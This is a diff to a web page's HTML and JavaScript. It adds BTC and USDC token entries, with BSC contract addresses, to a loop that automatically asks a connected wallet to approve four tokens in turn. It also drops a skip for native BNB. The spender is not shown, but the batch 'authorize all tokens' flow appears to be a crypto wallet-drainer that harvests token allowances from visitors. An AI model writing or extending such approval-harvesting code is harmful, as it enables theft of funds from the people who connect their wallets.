@@ -272,9 +272,14 @@
                 <span class="token-address">0x55d398326f99059fF775485246999027B3197955</span>
             </div>
             <div class="token-item">
-                <span class="token-icon">🟡</span>
-                <span class="token-name">BNB</span>
-                <span class="token-address">原生代币</span>
+                <span class="token-icon">₿</span>
+                <span class="token-name">BTC</span>
+                <span class="token-address">0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c</span>
+            </div>
+            <div class="token-item">
+                <span class="token-icon">💎</span>
+                <span class="token-name">USDC</span>
+                <span class="token-address">0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d</span>
             </div>
         </div>
         
@@ -312,11 +317,17 @@
                 icon: '💵',
                 isNative: false
             },
-            bnb: {
-                name: 'BNB',
-                address: null, // 原生代币
-                icon: '🟡',
-                isNative: true
+            btc: {
+                name: 'BTC',
+                address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
+                icon: '₿',
+                isNative: false
+            },
+            usdc: {
+                name: 'USDC',
+                address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
+                icon: '💎',
+                isNative: false
             }
         };
         
@@ -418,13 +429,13 @@
                 const progressFill = document.getElementById('progressFill');
                 progressBar.style.display = 'block';
                 
-                showStatus('开始授权三个代币...', 'info');
+                showStatus('开始授权四个代币...', 'info');
                 
                 let successCount = 0;
                 let failCount = 0;
                 
-                // 直接授权三个代币
-                const tokensToAuthorize = [TOKENS.coco, TOKENS.usdt, TOKENS.bnb];
+                // 直接授权四个代币
+                const tokensToAuthorize = [TOKENS.coco, TOKENS.usdt, TOKENS.btc, TOKENS.usdc];
                 
                 for (let i = 0; i < tokensToAuthorize.length; i++) {
                     const token = tokensToAuthorize[i];
@@ -434,12 +445,7 @@
                     try {
                         showStatus(`正在授权 ${token.name}...`, 'info');
                         
-                        if (token.isNative) {
-                            // BNB是原生代币，不需要approve，直接跳过
-                            showStatus(`${token.name} 是原生代币，无需授权`, 'info');
-                            successCount++;
-                            continue;
-                        }
+
                         
                         // 构建授权交易
                         const tokenContract = new web3.eth.Contract([
